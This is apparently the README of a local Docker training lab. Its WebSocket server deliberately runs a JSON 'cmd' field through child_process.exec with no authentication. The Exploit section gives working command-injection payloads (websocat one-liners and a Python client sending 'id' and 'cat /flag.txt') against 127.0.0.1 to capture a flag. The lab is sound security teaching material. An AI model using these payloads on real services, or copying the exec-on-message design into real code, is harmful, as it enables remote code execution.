# WebSocket Injection Lab (Docker)

WebSocket JSON handler runs `child_process.exec` on `{"type":"cmd","cmd":"..."}`.

```bash
./labctl.sh up websocket
```

| Item | Value |
|------|--------|
| Host URL | http://127.0.0.1:8116 |
| WS URL | ws://127.0.0.1:8116/ws |
| Skill | WebSocket message → command injection / RCE |
| Flag | `OSWE{websocket_injection_lab_flag}` |

## Exploit

```bash
# Health
curl -s http://127.0.0.1:8116/health

# Using websocat (if installed)
echo '{"type":"cmd","cmd":"id"}' | websocat -n1 ws://127.0.0.1:8116/ws
echo '{"type":"cmd","cmd":"cat /flag.txt"}' | websocat -n1 ws://127.0.0.1:8116/ws
echo '{"type":"flag"}' | websocat -n1 ws://127.0.0.1:8116/ws

# Using Python (websocket-client)
python3 - <<'PY'
from websocket import create_connection
import json
ws = create_connection("ws://127.0.0.1:8116/ws", timeout=5)
print("hello:", ws.recv())
ws.send(json.dumps({"type": "cmd", "cmd": "cat /flag.txt"}))
print("cmd:", ws.recv())
ws.send(json.dumps({"type": "flag"}))
print("flag:", ws.recv())
ws.close()
PY
```

Success signals: `uid=` in stdout, or flag string in response.

## White-box

- Path: `/ws` WebSocketServer
- Sink: `exec(msg.cmd)` for `type==cmd`
- Methodology: `guides/WebSocket-Attack-Patterns.md`
- Snippet: `snippets/websocket_client.py`

## Notes

Teaching clone — no authentication on the socket (intentionally weak).
